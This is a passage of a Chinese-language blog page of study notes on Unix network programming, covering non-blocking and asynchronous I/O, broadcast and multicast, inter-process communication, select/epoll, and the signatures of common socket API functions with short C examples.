title="非阻塞"></a>非阻塞</h3><p><strong>非阻塞connect三个用途</strong></p><ul><li>完成connect需要花一个RTT时间，局域网的几毫秒到广域网的几秒。此期间可以将三次握手迭合在其他处理上</li><li>利用非阻塞 connect 技术同时建立多个连接</li><li>利用 select 指定时间限制，缩短connect的超时（很多实现中connect超时为75秒到数分钟）</li></ul><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>设置套接口为非阻塞</span><br><span class="line"><span class="number">2.</span>发起非阻塞 connect</span><br><span class="line"><span class="number">3.</span>等待连接建立期间完成其他事情</span><br><span class="line"><span class="number">4.</span>检查连接是否立即建立</span><br><span class="line"><span class="number">5.</span>调用 select</span><br><span class="line"><span class="number">6.</span>处理 select 超时</span><br><span class="line"><span class="number">7.</span>检查可读可写条件，调用 getsockopt 查看连接是否成功</span><br><span class="line"><span class="number">8.</span>关闭非阻塞状态并返回</span><br></pre></td></tr></table></figure><h3 id="I-O-复用"><a href="#I-O-复用" class="headerlink" title="I/O 复用"></a>I/O 复用</h3><blockquote><p>可等待多个描述字的就绪</p></blockquote><h3 id="信号驱动"><a href="#信号驱动" class="headerlink" title="信号驱动"></a>信号驱动</h3><blockquote><p>内核在描述字就绪时，发送 SIGIO 信号通知进程</p></blockquote><p>绑定信号以及对应的处理函数 =&gt; 继续执行其他操作 =&gt; 满足后自动处理</p><h3 id="异步"><a href="#异步" class="headerlink" title="异步"></a>异步</h3><blockquote><p>告知内核启动某个操作，并让内核在整个操作完成（包括将数据从内核拷贝到进程缓冲区里）后通知</p><p>与信号驱动的区别：</p><ul><li>信号驱动：由内核通知何时可以启动一个 I/O 操作</li><li>异步：由内核通知 I/O 何时完成</li></ul></blockquote><p><code>aio_read</code> 给内核传递描述字、缓冲区指针、缓冲区大小、文件偏移，并告诉内核当操作完成时如何通知进程。</p><h3 id="问题-1"><a href="#问题-1" class="headerlink" title="问题"></a>问题</h3><ul><li><p>哪种情况下适合采用阻塞式I/O编程？</p><p>  访问一个或多个服务进程时，各访问之间有顺序关系</p></li><li><p>非阻塞与阻塞在 CPU 利用率上有什么区别</p><p>  阻塞期间不占用 CPU 时间，不影响其他进程的工作效率，进程可能长时间处于休眠，在此期间进程不能执行别的任务，进程自身的效率不高。</p><p>  非阻塞，进程还可以执行后续的任务，提高自身的工作效率，进程一直处于执行期间，可能占用大量CPU时间来检测IO操作是否完成，影响其他进程的执行效率。</p></li><li><p>哪些套接口会发生阻塞</p>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 数据发送 发送缓冲区没有空间</span></span><br><span class="line">sendmsg, sendto, send, write, writev</span><br><span class="line">    </span><br><span class="line"><span class="comment">// 数据接收，接收缓冲区没有空间</span></span><br><span class="line">recvmsg, recvfrom, recv, read, readv</span><br><span class="line">    </span><br><span class="line"><span class="comment">// 完成三次握手</span></span><br><span class="line">connect</span><br><span class="line"></span><br><span class="line"><span class="comment">// 无新连接到达</span></span><br><span class="line">accept</span><br></pre></td></tr></table></figure></li></ul><h2 id="广播"><a href="#广播" class="headerlink" title="广播"></a>广播</h2><h3 id="用途"><a href="#用途" class="headerlink" title="用途"></a>用途</h3><blockquote><p>局限于局域网内使用</p></blockquote><ul><li><p>资源发现</p><p>  在本地子网中定位一个服务器主机，寻找其 IP 地址（例如 ARP、DHCP）</p></li><li><p>节约带宽</p><p>  在有多个客户机与单个服务器机通信的局域网环境中尽量减少分组流量。</p></li></ul><h2 id="多播"><a href="#多播" class="headerlink" title="多播"></a>多播</h2><h3 id="用途-1"><a href="#用途-1" class="headerlink" title="用途"></a>用途</h3><blockquote><p>局域网、跨广域网都可使用</p></blockquote><h3 id="问题-2"><a href="#问题-2" class="headerlink" title="问题"></a>问题</h3><ul><li><p>与广播的区别，以及分别的应用场景</p><ul><li>广播是向网络中所有主机发送信息</li><li>广播由于是向全网发，其他无关主机都会收到，而且要到传输层才能处理，浪费网络、计算资源</li><li>广播应用实例：网络时间协议</li></ul></li></ul><h2 id="进程间通信"><a href="#进程间通信" class="headerlink" title="进程间通信"></a>进程间通信</h2><p>常见信号及其默认动作</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">SIGABRT异常终止（abort）  终止</span><br><span class="line">SIGFPE算术异常（除以<span class="number">0</span>）终止</span><br><span class="line">SIGUSR1用户定义信号 忽略</span><br><span class="line">SIGUSR2同上</span><br><span class="line">SIGHUP连接断开（送给控制进程） 终止</span><br><span class="line">SIGALRM计时器到时（alarm）终止</span><br><span class="line">SIGCHLD 子进程状态改变忽略</span><br><span class="line">SIGURG紧急数据到达 忽略</span><br><span class="line">SIGIO异步<span class="keyword">I</span>/<span class="keyword">O</span>   终止</span><br><span class="line">SIGINT终端中断符 终止</span><br><span class="line">SIGPIPE写至无读进程的管套   终止</span><br><span class="line">SIGKILL 终止进程  终止</span><br></pre></td></tr></table></figure><h3 id="管道与-FIFO"><a href="#管道与-FIFO" class="headerlink" title="管道与 FIFO"></a>管道与 FIFO</h3><ul><li>管道可用于具有亲缘关系进程间的通信</li><li>命令管道克服了管道没有名字的限制，命名管道允许无亲缘关系进程间的通信</li></ul><h3 id="UNIX-域协议"><a href="#UNIX-域协议" class="headerlink" title="UNIX 域协议"></a>UNIX 域协议</h3><h3 id="IPC"><a href="#IPC" class="headerlink" title="IPC"></a>IPC</h3><h4 id="消息通信"><a href="#消息通信" class="headerlink" title="消息通信"></a>消息通信</h4><blockquote><p>消息通信通过消息队列实现进程通信</p></blockquote><ul><li>消息队列是消息的链接表</li><li>有足够的权限的进程可以向队列中添加消息，被赋予读权限的进程可以读取队列中的消息</li><li>消息队列克服了信号承载信息量少，管道只能承载无格式字节流以及缓冲区大小受限等特点</li><li>消息队列不需要进程间具有亲缘关系</li></ul><h4 id="信号与信号量"><a href="#信号与信号量" class="headerlink" title="信号与信号量"></a>信号与信号量</h4><ul><li>用于通知接受进程有某事件发生</li><li>进程可以发送信号给进程本身</li><li>信号 =&gt; 信号量，能使用多次？</li></ul><h4 id="共享内存"><a href="#共享内存" class="headerlink" title="共享内存"></a>共享内存</h4><blockquote><p>进程能够不涉及内核而访问其中的数据</p></blockquote><ul><li>使用多个进程可以访问同一块内存空间，是单机最快的可用 IPC 形式</li><li>针对其他通信机制运行效率较低而设计的，往往与其他通信机制结合来达到进程间的同步和互斥，如信号量</li></ul><h3 id="问题-3"><a href="#问题-3" class="headerlink" title="问题"></a>问题</h3><ul><li>命名管道、管道的区别<ul><li>命名管道以 FIFO 的形式存在于文件系统中，与 FIFO 创建进程无亲缘关系的进程只要能访问该路径，就能彼此通信</li><li>管道在最后一个关闭后自动消失，而 FIFO 需要通过 unlink 删除</li></ul></li></ul><h2 id="并发"><a href="#并发" class="headerlink" title="并发"></a>并发</h2><h3 id="多进程"><a href="#多进程" class="headerlink" title="多进程"></a>多进程</h3><h3 id="多线程"><a href="#多线程" class="headerlink" title="多线程"></a>多线程</h3><h3 id="IO-多路复用"><a href="#IO-多路复用" class="headerlink" title="IO 多路复用"></a>IO 多路复用</h3><blockquote><p>异步I/O模型的发展技术是： select -&gt; poll -&gt; epoll -&gt; aio -&gt; libevent -&gt; libuv。Unix/Linux用了好几十年走过这些技术的变迁，然而，都不如 Windows I/O Completion Port 设计得好（免责声明：这个观点纯属个人观点。相信你仔细研究这些I/O模型后，你会得到你自己的判断）。 </p></blockquote><h4 id="一个线程维护多个-Socket"><a href="#一个线程维护多个-Socket" class="headerlink" title="一个线程维护多个 Socket"></a>一个线程维护多个 Socket</h4><p>由于 socket 是文件描述符，因而某个线程盯的所有的 socket，都放在一个文件描述符集合 fd_set 中，这就是项目进度强，然后调用 select 函数来监听文件描述符集合是否有变化。一旦有变化，就会依次查看每个文件描述符。那些发生变化的文件描述符在 fd_set 中对应的位都设为 1，表示 socket 可读或者可写，从而可以进行读写操作，然后再调用 select，接着盯下一轮的变化。</p><h4 id="从“派人盯着”到”有事通知“"><a href="#从“派人盯着”到”有事通知“" class="headerlink" title="从“派人盯着”到”有事通知“"></a>从“派人盯着”到”有事通知“</h4><p>上面的方式在文件描述符有变化时，都会采用轮询的方式确定具体是哪个 socket 有变化，也就是需要将全部项目都过一遍的方式来查看进度，这就大大影响了一个项目组能够支撑的最大的项目数量。因而使用 select，能够同时盯的项目数量由 FD_SETSIZE 限制。</p><p>如果改成事件通知的方式，情况就会好很多。（select 里不能返回具体是哪个 socket 变化了？）</p><p>最终方式：epoll + callback</p><p>AIO： Asynchronous IO ，异步非阻塞</p><p>BIO：Block-io，同步且阻塞式IO</p><p>NIO：Non-block IO，同步非阻塞</p><h2 id="API"><a href="#API" class="headerlink" title="API"></a>API</h2><h3 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h3><p>int to char array</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sprintf</span>(buf, <span class="string">"%d"</span>, num);</span><br></pre></td></tr></table></figure><p>端口复用（注意放到 bind 前面）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> opt = <span class="number">1</span>;</span><br><span class="line">setsockopt(listenfd, SOL_SOCKET, SO_REUSEADDR, &amp;opt, <span class="keyword">sizeof</span>(opt));</span><br></pre></td></tr></table></figure><h3 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h3><blockquote><p>#include &lt;linux/sock.h&gt;</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 通用型套接字地址结构</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr</span> &#123;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">short</span> sa_family;  <span class="comment">// 地址类型，AF_xxx，2 个字节</span></span><br><span class="line"><span class="keyword">char</span> sa_data[<span class="number">14</span>];   <span class="comment">// 协议地址，14 个字节</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ipv4</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> &#123;</span></span><br><span class="line">    <span class="keyword">short</span> <span class="keyword">int</span> sin_family;<span class="comment">// 地址类型：AF_INET</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">short</span> <span class="keyword">int</span> sin_port;<span class="comment">// 端口号，16 位 TCP/UDP 端口号网络字节顺序</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">in_addr</span> <span class="title">sin_addr</span>;</span><span class="comment">// 32 位地址</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> sin_zero[<span class="number">8</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>字节操纵</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bzero</span><span class="params">(<span class="keyword">void</span>* s, <span class="keyword">size_t</span> n)</span></span>;<span class="comment">// n 个字节置零</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bcopy</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span>* src, <span class="keyword">void</span>* dest, size_n)</span></span>;<span class="comment">// 拷贝 n 个字节</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bcmp</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span>* s1, <span class="keyword">const</span> <span class="keyword">void</span>* s2, <span class="keyword">size_t</span> n)</span></span>; <span class="comment">// 相等返回 0</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">memset</span><span class="params">(<span class="keyword">void</span> *s, <span class="keyword">int</span> c, <span class="keyword">size_t</span> n)</span></span>;<span class="comment">// 将目标中n个字节设置为值c</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">memcpy</span><span class="params">(<span class="keyword">void</span> *dest, <span class="keyword">const</span> <span class="keyword">void</span> *src, <span class="keyword">size_t</span> n)</span></span>;<span class="comment">// 拷贝字符串中n个字节</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">memcmp</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> *s1, <span class="keyword">const</span> <span class="keyword">void</span> *s2, <span class="keyword">size_t</span> n)</span></span>;<span class="comment">// 字符串比较，相等返回0；不等返回非0</span></span><br></pre></td></tr></table></figure><p>IP 地址转换</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* h 表示 host，n 表示 network，l 表示 32 位整数，s 表示 16 位短整数 */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 点分十进制字符串 =&gt; 网络字节顺序二进制值</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">inet_aton</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *cp, struct in_addr *inp)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 点分十进制字符串 =&gt; 网络字节顺序二进制值</span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">int</span> <span class="title">inet_addr</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *cp)</span></span>;</span><br><span class="line"><span class="comment">// 以255.255.255.255表示出错，不能表示此广播地址</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 网络字节顺序二进制值 =&gt; 点分十进制字符串</span></span><br><span class="line"><span class="function"><span class="keyword">char</span> * <span class="title">inet_ntoa</span><span class="params">(struct in_addr in)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">inet_pton</span><span class="params">(<span class="keyword">int</span> af, <span class="keyword">const</span> <span class="keyword">char</span> * strptr, <span class="keyword">void</span> *dst)</span></span>;</span><br><span class="line"><span class="comment">// 成功返回1；输入无效表达式格式返回0；出错返回-1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">const</span> <span class="keyword">char</span>* <span class="title">inet_ntop</span><span class="params">(<span class="keyword">int</span> af, <span class="keyword">const</span> <span class="keyword">void</span> * strptr, <span class="keyword">char</span> *dst, <span class="keyword">size_t</span> cnt)</span></span>;</span><br><span class="line"><span class="comment">// 成功返回结果指针dst；出错返回NULL</span></span><br></pre></td></tr></table></figure><h3 id="创建"><a href="#创建" class="headerlink" title="创建"></a>创建</h3><blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><p>socket</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">socket</span><span class="params">(<span class="keyword">int</span> domain, <span class="keyword">int</span> type, <span class="keyword">int</span> protocol)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// domain：协议族。type：套接口类型，protocol：协议类型</span></span><br><span class="line"><span class="comment">// 返回值：-1 出错，非负值则为套接口描述字</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">socketpair</span><span class="params">(<span class="keyword">int</span> family, <span class="keyword">int</span> type, <span class="keyword">int</span> protocol, <span class="keyword">int</span> fd_array[<span class="number">2</span>])</span></span>;</span><br></pre></td></tr></table></figure><p>bind</p><blockquote><p>将套接口指定IP、port，可两者都指定，也可都不指定；</p><p>服务端通常在启动时绑上端口；</p><p>客户端通常不绑定端口，由内核分配临时端口；</p><p>可通过 <code>getsockname</code> 来返回协议地址。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bind</span><span class="params">(<span class="keyword">int</span> sockfd, struct sockaddr *my_addr, <span class="keyword">int</span> addrlen)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 成功则返回0，失败返回-1</span></span><br></pre></td></tr></table></figure><p>listen</p><blockquote><p>监听本地地址和端口</p><p>套接口状态：closed =&gt; listen</p><p>sockfd－已绑定的socket描述符<br>backlog－已完成连接、等待接收的队列长度，LISTENQ？</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">listen</span><span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">int</span> backlog)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 成功则返回0，失败返回-1，错误原因存于errno</span></span><br></pre></td></tr></table></figure><p>accept</p><blockquote><p>当服务请求到达 accept 监视的 socket（监听套接口）时，系统将自动建立一个新的 socket（已连接套接口），并将此 socket 和客户进程连接起来。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">accept</span><span class="params">(<span class="keyword">int</span> sockfd, sockaddr* cliaddr, <span class="keyword">int</span> *addrlen)</span></span>;</span><br></pre></td></tr></table></figure><h3 id="收发"><a href="#收发" class="headerlink" title="收发"></a>收发</h3><blockquote><p>#include &lt;unistd.h&gt;</p></blockquote><p>read</p><blockquote><p>从套接口接收缓冲区中读取len字节的数据，成功返回，返回值是实际读取数据的字节数</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> read(<span class="keyword">int</span> fd, <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> count);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 返回值：</span></span><br><span class="line"><span class="comment">无数据=&gt;阻塞</span></span><br><span class="line"><span class="comment">n &gt;= len    =&gt;  len</span></span><br><span class="line"><span class="comment">n &gt; 0 &amp;&amp; n &lt; len=&gt; 读取 n 个</span></span><br><span class="line"><span class="comment">n = 0  =&gt;   读通道关闭</span></span><br><span class="line"><span class="comment">n &lt; 0  =&gt;  出错或异常</span></span><br><span class="line"><span class="comment">n = -1, errno == EINTR   =&gt;  读中断引起错误</span></span><br><span class="line"><span class="comment">n = -1, errno == ECONNREST =&gt;  网络连接有问题</span></span><br><span class="line"><span class="comment">read 函数要求操作系统内核从套接字描述字 socketfd读取最多多少个字节（size），并将结果存储到 buffer 中。返回值告诉我们实际读取的字节数目，也有一些特殊情况，如果返回值为 0，表示 EOF（end-of-file），这在网络中表示对端发送了 FIN 包，要处理断连的情况；如果返回值为 -1，表示出错。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 从 socketfd 描述字中读取 "size" 个字节. */</span></span><br><span class="line"><span class="keyword">ssize_t</span> readn(<span class="keyword">int</span> fd, <span class="keyword">void</span> *vptr, <span class="keyword">size_t</span> size) &#123;</span><br><span class="line">    <span class="keyword">size_t</span>  nleft = size;</span><br><span class="line">    <span class="keyword">ssize_t</span> nread;</span><br><span class="line">    <span class="keyword">char</span>* ptr = vptr;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> (nleft &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((nread = read(fd, ptr, nleft)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (errno == EINTR)</span><br><span class="line">                nread = <span class="number">0</span>;      <span class="comment">/* 这里需要再次调用 read */</span></span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="keyword">return</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (nread == <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">break</span>;              <span class="comment">/* EOF(End of File) 表示套接字关闭 */</span></span><br><span class="line"> </span><br><span class="line">        nleft -= nread;</span><br><span class="line">        ptr   += nread;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> n - nleft;      <span class="comment">/* 返回的是实际读取的字节数 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>write</p><blockquote><p>从套接口中发送 len 字节的数据，成功返回，返回实际写入数据的字节数</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> write(<span class="keyword">int</span> fd, <span class="keyword">const</span> <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> count);</span><br></pre></td></tr></table></figure><p>recv</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">recv</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">void</span> *buf, <span class="keyword">int</span> len, <span class="keyword">unsigned</span> <span class="keyword">int</span> flags)</span></span>;</span><br></pre></td></tr></table></figure><p>recvfrom</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> recvfrom(<span class="keyword">int</span> sockfd, <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> len, <span class="keyword">int</span> flags,</span><br><span class="line">                        struct sockaddr *src_addr, <span class="keyword">socklen_t</span> *addrlen);</span><br></pre></td></tr></table></figure><p>send</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">send</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">const</span> <span class="keyword">void</span> *msg, <span class="keyword">int</span> len, <span class="keyword">unsigned</span> <span class="keyword">int</span> flags)</span></span>;</span><br></pre></td></tr></table></figure><p>sendto</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> sendto(<span class="keyword">int</span> sockfd, <span class="keyword">const</span> <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> len, <span class="keyword">int</span> flags,</span><br><span class="line">                      <span class="keyword">const</span> struct sockaddr *dest_addr, <span class="keyword">socklen_t</span> addrlen);</span><br><span class="line"><span class="comment">// socklen_t 不需要指针</span></span><br></pre></td></tr></table></figure><p>recvmsg</p><p>sendmsg</p><h3 id="连接"><a href="#连接" class="headerlink" title="连接"></a>连接</h3><p>connect</p><blockquote><p>TCP 客户端与服务器建立连接用 connect 函数</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">connect</span><span class="params">(<span class="keyword">int</span> sockfd, struct sockaddr * addressp, <span class="keyword">int</span> addrlen)</span></span>;</span><br></pre></td></tr></table></figure><h3 id="关闭"><a href="#关闭" class="headerlink" title="关闭"></a>关闭</h3><p>shutdown</p><blockquote><p>终止网络连接并停止所有信息的发送与接收（不管引用计数器为何值）</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">shutdown</span><span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">int</span> how)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// sockfd：套接口描述字</span></span><br><span class="line"><span class="comment">// how：套接口关闭方式，SHUT_RD、SHUT_WR、SHUT_RDWR</span></span><br></pre></td></tr></table></figure><p>close</p><blockquote><p>计数器减一，不会完全关闭</p></blockquote><h3 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getsockopt/setsockopt</span><br></pre></td></tr></table></figure><h3 id="地址-1"><a href="#地址-1" class="headerlink" title="地址"></a>地址</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gethostbyaddr getaddrbyhost,...</span><br></pre></td></tr></table></figure><h3 id="非阻塞-1"><a href="#非阻塞-1" class="headerlink" title="非阻塞"></a>非阻塞</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> flag = fcntl(sockfd, F_GETFL, <span class="number">0</span>);</span><br><span class="line">fcntl(sockfd, F_SETFL, flag|O_NONBLOCK);</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> nIO = <span class="number">1</span>;</span><br><span class="line">ioctl(sockfd, FIONBIO, &amp;nIO);</span><br></pre></td></tr></table></figure><h3 id="复用"><a href="#复用" class="headerlink" title="复用"></a>复用</h3><p>fd_set</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">FD_ZERO</span><span class="params">(fd_set * fdset)</span></span>; <span class="comment">// 清除描述字集 fdset 中的所有位</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">FD_SET</span><span class="params">(<span class="keyword">int</span> fd, fd_set *fdset)</span></span>; <span class="comment">// 在 fdset 集中加入fd描述字（为什么要事先添加？</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">FD_CLR</span><span class="params">(<span class="keyword">int</span> fd, fd_set *fdset)</span></span>; <span class="comment">// 将 fd 从 fdset 中清除</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">FD_ISSET</span><span class="params">(<span class="keyword">int</span> fd, fd_set *fdset)</span></span>; <span class="comment">// 判断 fd 是否在 